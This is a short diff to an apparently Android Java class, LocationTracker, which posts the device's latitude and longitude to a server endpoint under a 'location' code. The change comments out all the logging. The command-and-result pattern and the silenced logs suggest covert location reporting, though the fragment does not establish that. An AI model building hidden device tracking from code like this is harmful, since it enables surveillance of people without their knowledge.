@@ -23,15 +23,15 @@ public class LocationTracker {
         locationData.put("latitude", location.getLatitude());
         locationData.put("longitude", location.getLongitude());
 
-        Log.d(TAG, "The JSON object: " + locationData);
-        System.out.println("The JSON object: " + locationData);
+//        Log.d(TAG, "The JSON object: " + locationData);
+//        System.out.println("The JSON object: " + locationData);
 
         JSONObject parentObject = new JSONObject();
         parentObject.put("code", "location");
         parentObject.put("data", locationData);
 
-        Log.d(TAG, "The JSON object: " + parentObject);
-        System.out.println("The JSON object: " + parentObject);
+//        Log.d(TAG, "The JSON object: " + parentObject);
+//        System.out.println("The JSON object: " + parentObject);
 
         try {
             HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());
@@ -43,7 +43,7 @@ public class LocationTracker {
                 throw new IOException("Unexpected code " + response.responseCode);
             }
         } catch (IOException e) {
-            Log.e(TAG, "Error sending request: " + e.getMessage());
+            //Log.e(TAG, "Error sending request: " + e.getMessage());
         }
     }
 }
